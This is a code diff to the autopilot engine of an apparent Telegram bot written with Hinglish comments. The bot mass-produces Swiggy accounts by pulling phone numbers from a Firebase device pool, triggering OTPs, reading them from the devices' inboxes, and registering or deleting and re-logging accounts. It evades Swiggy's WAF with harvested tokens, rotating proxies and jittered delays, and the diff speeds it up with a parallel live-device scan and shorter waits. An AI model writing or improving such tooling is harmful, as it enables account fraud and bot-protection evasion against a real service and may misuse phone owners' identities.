@@ -7,15 +7,16 @@
 // Env knobs:
 //   PREMIUM_BATCH_TARGET            — kitne fresh sessions (default 100)
 //   PREMIUM_BATCH_MAX_MINUTES       — max run time (default 120)
-//   PREMIUM_BATCH_GAP_MS            — do numbers ke beech gap (default 15000)
+//   PREMIUM_BATCH_GAP_MS            — do numbers ke beech gap (default 6000)
 //   PREMIUM_RATE_LIMIT_BACKOFF_MS   — Swiggy rate-limit par ruk (default 15 min)
 //   PREMIUM_ALLOW_OFFLINE_DEVICES   — '1' = offline devices bhi try karo
-//   PREMIUM_OTP_WAIT_MS             — pehle wait (default 10000 = uske 10s)
+//   PREMIUM_OTP_WAIT_MS             — poll shuru karne se pehle wait (default 3000)
 //   PREMIUM_OTP_TIMEOUT_MS          — inbox poll budget (default 90000)
+//   PREMIUM_DEVICE_ACTIVE_WINDOW_MS — last-seen gate window (default 60000, 0=off)
 //
 // Engine process-singleton hai: dono bots (main + autopilot) isi state ko dekhte hain.
 
-import { isFirebaseConfigured, firebaseSetupHintLines, listPoolNumbers } from './firebase-numbers.js';
+import { isFirebaseConfigured, firebaseSetupHintLines, listPoolNumbers, scanFreshDevices } from './firebase-numbers.js';
 import { applyActiveSource } from './firebase-sources.js';
 import { getSetting } from './bot-settings.js';
 import { processSingleNumber, freshEntriesFrom, preferOnline, getPremiumLedger } from './number-pipeline.js';
@@ -67,6 +68,9 @@ const state = {
   lastError: '',
   poolTotal: 0,
   poolFresh: 0,
+  scanning: false,        // abhi devices ki parallel last-seen scan chal rahi hai
+  scanChecked: 0,         // is run me kitne devices probe hue
+  scanFresh: 0,           // hot-queue me ready (fresh) devices
 };
 
 export function getAutopilotSnapshot() {
@@ -96,6 +100,9 @@ export function getAutopilotSnapshot() {
     current: state.current ? { ...state.current } : null,
     poolTotal: state.poolTotal,
     poolFresh: state.poolFresh,
+    scanning: Boolean(state.scanning),
+    scanChecked: state.scanChecked || 0,
+    scanFresh: state.scanFresh || 0,
     lastError: state.lastError,
     history: state.history.slice(-40),
     freshAccounts: state.freshAccounts.slice(-100),
@@ -143,10 +150,15 @@ function statsLines() {
     pSummary?.enabled
       ? field('🔀 Proxy', `${getBridgeProxy()?.label || '—'}  ·  ${pSummary.enabledCount} ON  ·  rotates: ${state.proxyRotations}`)
       : field('🔀 Proxy', 'OFF (ek hi IP — ⚙️ Settings me add karo)'),
-    field('Pool', `${state.poolFresh} fresh / ${state.poolTotal} numbers`),
+    field('Pool', state.poolTotal
+      ? `${state.poolFresh} fresh / ${state.poolTotal} numbers`
+      : 'load ho raha hai…'),
+    (state.scanning || state.scanChecked)
+      ? field('🔎 Device scan', `${state.scanChecked || 0} check · ${state.scanFresh || 0} fresh ready${state.scanning ? ' · scanning…' : ''}`)
+      : '',
     state.current
       ? `📍 <b>Abhi:</b> <code>${esc(state.current.phone)}</code> (${fmtDuration(Date.now() - state.current.startedAt)})`
-      : sub('Agla number select ho raha hai…'),
+      : sub(state.scanning ? 'Zinda devices dhoondh raha hoon (parallel scan)…' : 'Agla number select ho raha hai…'),
   ];
 }
 
@@ -161,8 +173,8 @@ function idleCard() {
     : [
         `› <b>READY.</b> Ek tap = autopilot ON.`,
         ``,
-        `1️⃣ Firebase pool se number uthata hai (online devices pehle)`,
-        `2️⃣ Swiggy OTP → <b>10s wait</b> → OTP khud padh kar paste`,
+        `1️⃣ Pehle <b>zinda devices</b> parallel scan (last-seen fresh pehle)`,
+        `2️⃣ Swiggy OTP → <b>live inbox poll</b> → OTP khud padh kar paste`,
         `3️⃣ 🆕 naya = register · ♻️ purana = delete → fresh login`,
         `4️⃣ charges/order/wallet block = <b>skip</b> · rate-limit = <b>backoff</b>`,
         ``,
@@ -265,14 +277,14 @@ export async function startAutopilot(opts = {}) {
   const maxMinutes = Number(opts.maxMinutes || s('maxMinutes', envInt('PREMIUM_BATCH_MAX_MINUTES', 120)));
   const gapMs = Number.isFinite(Number(opts.gapMs)) && Number(opts.gapMs) >= 0
     ? Number(opts.gapMs)
-    : s('gapMs', envInt('PREMIUM_BATCH_GAP_MS', 15_000));
+    : s('gapMs', envInt('PREMIUM_BATCH_GAP_MS', 6_000));
   const backoffMs = s('backoffMs', envInt('PREMIUM_RATE_LIMIT_BACKOFF_MS', 15 * 60_000));
   const allowOffline = s('allowOffline', String(process.env.PREMIUM_ALLOW_OFFLINE_DEVICES || '') === '1') === true;
   const otpCfg = {
-    waitMs: s('otpWaitMs', envInt('PREMIUM_OTP_WAIT_MS', 10_000)),
+    waitMs: s('otpWaitMs', envInt('PREMIUM_OTP_WAIT_MS', 3_000)),
     timeoutMs: s('otpTimeoutMs', envInt('PREMIUM_OTP_TIMEOUT_MS', 90_000)),
-    pollMs: 2_500,
-    acceptAnyAfterMs: 30_000,
+    pollMs: 1_500,
+    acceptAnyAfterMs: 15_000,
     // Device last-seen gate: sirf wahi devices jinki last activity itni
     // taazi hai. Default 60s; sakht 10s ke liye Render env me
     // PREMIUM_DEVICE_ACTIVE_WINDOW_MS=10000 (aur 0 = gate off).
@@ -291,6 +303,7 @@ export async function startAutopilot(opts = {}) {
     rateStrikes: 0, wafStrikes: 0, wafCooldowns: 0, consecutiveFails: 0, proxyRotations: 0,
     current: null, history: [], freshAccounts: [], lastError: '',
     poolTotal: 0, poolFresh: 0,
+    scanning: false, scanChecked: 0, scanFresh: 0,
   });
 
   const userId = opts.userId || 'autopilot';
@@ -357,7 +370,8 @@ export async function startAutopilot(opts = {}) {
         ? `🔀 Proxy pool: ${ps.enabledCount}/${ps.total} proxies ON — ${ps.rotation}`
         : `🔀 Proxy pool: OFF (ek hi IP) — ⚙️ Settings me proxy add karne par rukna bilkul band.`,
       'Swiggy WAF token arrange kar raha hoon (ek baar, ~15s)…',
-      sub('Iske baad saari requests protected jaengi.'),
+      '📋 Saath hi pool load + zinda devices ki parallel scan chal rahi hai…',
+      sub('Token ready hote hi pehla OTP fresh device par jayega.'),
     ].join('\n')), stopRows());
 
     // Proxy assign — pehli enabled proxy (round-robin se). WAF token bhi
@@ -374,32 +388,60 @@ export async function startAutopilot(opts = {}) {
     };
     if (ps.enabled) rotateProxy();
 
+    // Pool load (bada node — ek baar, zarurat par refresh). YE WAF warm-up ke
+    // SAATH parallel chalega — pehle dono ek-ke-peeche-ek the isliye pehla
+    // number 30-60s baad ja kar start hota tha.
+    let pool = [];
+    let poolLoadedAt = 0;
+    const loadPool = async () => {
+      pool = await listPoolNumbers();
+      poolLoadedAt = Date.now();
+      state.poolTotal = pool.length;
+      state.poolFresh = freshEntriesFrom(pool).length;
+      return pool;
+    };
+    const poolPromise = loadPool().catch((e) => {
+      state.lastError = e?.message || 'pool load fail';
+      return pool;
+    });
+
+    // WAF warm-up BACKGROUND me — pool load + device scan iska wait nahi
+    // karte. Pehla OTP bhejane se pehle ensureWarm() ise await karega.
     let wafTok = '';
-    try {
-      wafPool.loadFromDb?.();
-      wafTok = await getLiveSwiggyWafToken();
-      console.log(wafTok ? '[Autopilot] WAF token ready (warm start).' : '[Autopilot] WAF token nahi mila (Chromium?) — raw mode me chalega.');
-    } catch (e) {
-      console.warn('[Autopilot] WAF warm-up skipped:', e?.message);
-    }
-    // Chrome hi nahi mila aur saved token bhi nahi → har OTP par 403 pakki
-    // hai. Pehle ye sirf console me chup chaap reh jata tha aur user ko
-    // lagta tha "bot work nahi kar raha" — ab Telegram card par saaf btao.
-    if (!wafTok) {
-      let chrome = null;
-      try { chrome = getChromeStatus(); } catch {}
-      if (chrome && !chrome.found) {
-        await push(section('⚠️ Chrome Nahi Mila — WAF Token Nahi Banega', [
-          '› Is machine par <b>Chrome/Chromium nahi mila</b>, isliye Swiggy ka',
-          '› WAF token arrange nahi ho payega — OTP requests par <b>403</b> aayegi.',
-          '',
-          '› <b>Fix:</b> Google Chrome install karo, <i>ya</i> <code>.env</code> me daalo:',
-          '<code>PUPPETEER_EXECUTABLE_PATH=&lt;chrome.exe ka full path&gt;</code>',
-          '',
-          sub('Batch phir bhi try karega (raw mode) — lekin Chrome lagana hi sahi tod hai. /diag se status check karo.'),
-        ].join('\n')), stopRows());
+    const warmPromise = (async () => {
+      try {
+        wafPool.loadFromDb?.();
+        wafTok = await getLiveSwiggyWafToken();
+        console.log(wafTok ? '[Autopilot] WAF token ready (warm start).' : '[Autopilot] WAF token nahi mila (Chromium?) — raw mode me chalega.');
+      } catch (e) {
+        console.warn('[Autopilot] WAF warm-up skipped:', e?.message);
       }
-    }
+      return wafTok;
+    })();
+    let warmAwaited = false;
+    const ensureWarm = async () => {
+      if (warmAwaited) return;
+      warmAwaited = true;
+      const tok = await warmPromise;
+      // Chrome hi nahi mila aur saved token bhi nahi → har OTP par 403 pakki
+      // hai. Pehle ye sirf console me chup chaap reh jata tha aur user ko
+      // lagta tha "bot work nahi kar raha" — ab Telegram card par saaf btao.
+      if (!tok) {
+        let chrome = null;
+        try { chrome = getChromeStatus(); } catch {}
+        if (chrome && !chrome.found) {
+          await push(section('⚠️ Chrome Nahi Mila — WAF Token Nahi Banega', [
+            '› Is machine par <b>Chrome/Chromium nahi mila</b>, isliye Swiggy ka',
+            '› WAF token arrange nahi ho payega — OTP requests par <b>403</b> aayegi.',
+            '',
+            '› <b>Fix:</b> Google Chrome install karo, <i>ya</i> <code>.env</code> me daalo:',
+            '<code>PUPPETEER_EXECUTABLE_PATH=&lt;chrome.exe ka full path&gt;</code>',
+            '',
+            sub('Batch phir bhi try karega (raw mode) — lekin Chrome lagana hi sahi tod hai. /diag se status check karo.'),
+          ].join('\n')), stopRows());
+        }
+      }
+    };
 
     // 🔁 Retry-later queue — rate-limit/WAF se atke numbers yahan jate hain
     // aur batch ke aage ISSI run me dobara try hote hain (batch na rukne ke liye).
@@ -411,19 +453,11 @@ export async function startAutopilot(opts = {}) {
       console.log(`[Autopilot] Deferred (${why}): ${entry.phone} — will retry in this run.`);
     };
 
+    await poolPromise; // pool ready — warm-up abhi bhi background me ho sakta hai
+    if (!pool.length && state.lastError) throw new Error(state.lastError); // Firebase error ko fatal hi rakho (pehle wala behavior)
+
+    // RUNNING card ab pool ke ASAL numbers ke saath (pehle 0/0 dikhta tha)
     await push(idleCard(), stopRows());
-
-    // Pool load (bada node — ek baar, zarurat par refresh)
-    let pool = [];
-    let poolLoadedAt = 0;
-    const loadPool = async () => {
-      pool = await listPoolNumbers();
-      poolLoadedAt = Date.now();
-      state.poolTotal = pool.length;
-      return pool;
-    };
-
-    await loadPool();
 
     const refreshIfStale = async () => {
       if (Date.now() - poolLoadedAt > 10 * 60_000) {
@@ -453,6 +487,69 @@ export async function startAutopilot(opts = {}) {
       return list;
     };
 
+    // ---- 🔎 Hot queue: parallel last-seen scan se ready fresh devices ----
+    // Pehle gate ek-ek number ko sequential probe karta tha — 3000-device
+    // pool me pehla zinda device milne me minutes lag jate the aur card par
+    // kuch dikhta bhi nahi tha (bot phasa lagta tha). Ab scan 24-parallel
+    // chunks me hota hai, fresh devices queue me ready rehte hain, aur card
+    // par live "X devices check, Y fresh" dikhta hai.
+    const gateOn = Number(otpCfg.activeWindowMs) > 0;
+    const hotQueue = [];            // { entry, lastActivityMs, windowMs, checkedAt }
+    const probedDevices = new Set(); // is pass me probe ho chuke deviceIds
+    const takeFromHotQueue = () => {
+      while (hotQueue.length) {
+        const h = hotQueue.shift();
+        state.scanFresh = hotQueue.length;
+        if (staleThisRun.has(h.entry.phone) || !underFailCap(h.entry)) continue;
+        if (getPremiumLedger()[h.entry.phone]) continue;
+        return h;
+      }
+      return null;
+    };
+    const refillHotQueue = async () => {
+      if (!gateOn) return { fresh: [] };
+      const candidates = pickFreshList().filter((e) => e.deviceId && !probedDevices.has(e.deviceId));
+      state.scanning = true;
+      const baseChecked = state.scanChecked || 0;
+      let lastPushAt = 0;
+      try {
+        const r = await scanFreshDevices(candidates, {
+          windowMs: otpCfg.activeWindowMs,
+          want: 8, chunkSize: 120, maxProbe: 800, concurrency: 24,
+          onProgress: ({ checked, freshCount }) => {
+            state.scanChecked = baseChecked + checked;
+            state.scanFresh = hotQueue.length + freshCount;
+            const now = Date.now();
+            if (now - lastPushAt >= 4000) {
+              lastPushAt = now;
+              void push(progressCard(section('🔎 Zinda Devices Dhoondh Raha Hoon', [
+                `› ${state.scanChecked} devices check hue — <b>${freshCount}</b> fresh mile (last-seen ≤${Math.round(otpCfg.activeWindowMs / 1000)}s).`,
+                sub('Mare hue devices par OTP nahi jata — pehle scan, phir sirf zinda device par OTP.'),
+              ].join('\n'))), stopRows());
+            }
+          },
+        });
+        for (const id of r.probedDeviceIds || []) probedDevices.add(id);
+        const at = Date.now();
+        for (const f of r.fresh) {
+          hotQueue.push({ entry: f.entry, lastActivityMs: f.lastActivityMs, windowMs: r.widestWindowMs, checkedAt: at });
+        }
+        state.scanChecked = baseChecked + (r.checked || 0);
+        state.scanFresh = hotQueue.length;
+        if (r.widened && r.fresh.length) {
+          console.log(`[Autopilot] Scan: window me fresh nahi mila — sabse taaze devices liye (~${Math.round(r.widestWindowMs / 1000)}s purani activity).`);
+        }
+        return r;
+      } finally {
+        state.scanning = false;
+        state.scanFresh = hotQueue.length;
+      }
+    };
+
+    // Pehla scan yahin — WAF warm-up ke parallel me hi (ensureWarm pehle
+    // OTP se pehle token confirm karega).
+    if (gateOn) await refillHotQueue();
+
     for (;;) {
       if (state.stopRequested) { endReason = state.stopReason || 'manual'; break; }
       if (Date.now() - state.startedAt > maxMinutes * 60_000) { endReason = 'time'; break; }
@@ -462,53 +559,82 @@ export async function startAutopilot(opts = {}) {
       const failLimit = ps.enabled ? 10 : 6;
       if (state.consecutiveFails >= failLimit) { endReason = 'circuit_breaker'; break; }
 
-      let fresh = pickFreshList();
-      state.poolFresh = fresh.length;
-      if (fresh.length) freshWaitRounds = 0;
+      state.poolFresh = freshEntriesFrom(pool).length;
 
-      if (!fresh.length) {
-        // Pool khali? Pehle retry-later queue check (ISI run me dobara).
-        if (retryLater.length) {
-          const r = retryLater.shift();
-          fresh = [r.entry];
-          state.poolFresh = 0;
-        } else {
-          await refreshIfStale();
-          fresh = pickFreshList();
-          state.poolFresh = fresh.length;
-          if (!fresh.length) {
-            // Numbers bache hain lekin sab ke devices abhi stale (last-seen
-            // window se bahar) — batch band karne ki jagah thodi der ruk kar
-            // dobara dekho, koi device zinda ho sakta hai. Max ~30 rounds
-            // (20s each ≈ 10 min), phir hi pool-exhausted.
-            const ledgerFreshLeft = freshEntriesFrom(pool).length;
-            if (ledgerFreshLeft > 0 && freshWaitRounds < 30) {
+      // ---- Selection: pehle hot-queue (scan kiye hue zinda devices) ----
+      let picked = takeFromHotQueue();
+
+      if (!picked && gateOn) {
+        await refillHotQueue();
+        picked = takeFromHotQueue();
+        if (!picked) {
+          if (retryLater.length) {
+            picked = { entry: retryLater.shift().entry };
+          } else {
+            await refreshIfStale();
+            state.poolFresh = freshEntriesFrom(pool).length;
+            // Abhi koi device taazi activity nahi dikha raha — batch band
+            // karne ke bajaye thodi der ruk kar DOBARA scan (device beech me
+            // zinda ho sakta hai). Max 40 rounds × 15s ≈ 10 min.
+            if (state.poolFresh > 0 && freshWaitRounds < 40) {
               freshWaitRounds++;
               await push(progressCard(section('🕐 Fresh Device Ka Wait', [
-                `› Abhi koi device last-seen window (≤${Math.round((otpCfg.activeWindowMs || 60000) / 1000)}s) me active nahi mila.`,
-                `› ${state.staleSkips || 0} stale devices chhaante gaye — 20s ruk kar pool dobara check karunga (round ${freshWaitRounds}/30).`,
+                `› Is waqt koi device taazi activity (last-seen) nahi dikha raha — ${state.scanChecked || 0} devices check kiye.`,
+                `› 15s ruk kar dobara scan karunga (round ${freshWaitRounds}/40).`,
                 sub('Andhere me mare hue devices par OTP waste nahi hoga.'),
               ].join('\n'))), stopRows());
-              await sleep(20_000, () => state.stopRequested);
+              await sleep(15_000, () => state.stopRequested);
               if (state.stopRequested) { endReason = state.stopReason || 'manual'; break; }
+              probedDevices.clear();
               staleThisRun.clear();
-              try { await loadPool(); } catch (e) { state.lastError = e?.message || 'pool reload fail'; }
               continue;
             }
-            // Pool khali + retry-later bhi khali → tabhi khatam
             endReason = 'pool-exhausted';
             break;
           }
         }
       }
 
-      const entry = fresh[0];
+      if (!picked && !gateOn) {
+        // Gate OFF (window=0) — purana random pick, backward compatible
+        let fresh = pickFreshList();
+        if (!fresh.length) {
+          if (retryLater.length) {
+            fresh = [retryLater.shift().entry];
+          } else {
+            await refreshIfStale();
+            fresh = pickFreshList();
+            if (!fresh.length) { endReason = 'pool-exhausted'; break; }
+          }
+        }
+        picked = { entry: fresh[0] };
+      }
+
+      if (!picked) { endReason = 'pool-exhausted'; break; }
+      if (picked.lastActivityMs) freshWaitRounds = 0;
+
+      const entry = picked.entry;
       state.current = { phone: entry.phone, startedAt: Date.now() };
+
+      // WAF warm-up background me chal raha tha — pehla OTP iske baghair na jaye
+      await ensureWarm();
+
+      // Scan se aaye number ka prechecked last-seen pipeline ko dedo — wahi
+      // device dobara fetch nahi hoga. Widened scan par gate window bhi usi
+      // hisaab se (warna pipeline usi number ko phir stale keh dega).
+      const numCfg = picked.lastActivityMs
+        ? {
+            ...otpCfg,
+            precheckedLastActivityMs: picked.lastActivityMs,
+            precheckedAt: picked.checkedAt || Date.now(),
+            activeWindowMs: Math.max(Number(otpCfg.activeWindowMs) || 0, Number(picked.windowMs) || 0),
+          }
+        : otpCfg;
 
       const res = await processSingleNumber({
         userId,
         entry,
-        otpCfg,
+        otpCfg: numCfg,
         shouldAbort: () => state.stopRequested,
         report: async (text) => { await push(progressCard(text), stopRows()); },
       });
@@ -654,7 +780,7 @@ export async function startAutopilot(opts = {}) {
 
       // Gap between numbers (Swiggy ke liye thoda breathing room)
       if (state.fresh < target && !state.stopRequested) {
-        const jitter = Math.floor(Math.random() * 8_000);
+        const jitter = Math.floor(Math.random() * 3_000);
         await sleep(gapMs + jitter, () => state.stopRequested);
       }
     }
